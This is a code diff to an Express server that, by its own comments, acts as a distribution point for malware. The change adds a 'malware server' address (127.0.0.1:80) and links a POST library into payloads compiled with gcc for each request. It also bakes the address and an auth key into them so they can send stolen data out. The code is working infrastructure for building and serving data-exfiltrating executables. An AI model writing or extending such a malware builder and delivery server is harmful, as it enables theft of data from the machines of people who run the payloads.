@@ -6,6 +6,9 @@ const { execFileSync } = require("child_process");
 const path = require("path");
 const logging = require("./logging.js");
 
+// Server IP we are hosting malware server on
+const IP = "127.0.0.1:80";
+
 // This router will handle the GET requests that ask to retrieve a specified malware.
 // The routing is very simple here since GET requests simply act as a CDN for our malware packages
 const getReqRouter = express.Router({
@@ -47,6 +50,9 @@ getReqRouter.get("/", (request, response, next) => {
 
         // We're also going to import the "Justin" library and bring in common.c
         let libraryPath = path.resolve(__dirname, "./Executables/common.c");
+        
+        // We're also going to import the POST request library
+        let postLibraryPath = path.resolve(__dirname, "./Executables/post.c");
 
         // Compiling might throw errors - here's where we catch that.
         try
@@ -61,10 +67,11 @@ getReqRouter.get("/", (request, response, next) => {
                 // Now, compile the GCC with a newly generated POST Authkey (if necessary) that will be used to when exfiltrating data
                 // Spawning subprocesses is always very dangerous, but we mitigate this by not spawning a shell and basically having prepared statements
                 // See auth.js for more about how the Authentication is designed
-                execFileSync("gcc", [reqEXEData.cPath, libraryPath, `-D postKey=${authKey}`, `-o`, exePath])
+                execFileSync("gcc", [reqEXEData.cPath, libraryPath, postLibraryPath, `-D postKey=${authKey}`, `-D address=${IP}`, `-o`, exePath])
             }
             else
             {
+                // We do not need the postLibraryPath if we're not exfiltrating data
                 execFileSync("gcc", [reqEXEData.cPath, libraryPath, `-o`, exePath])
             }
 
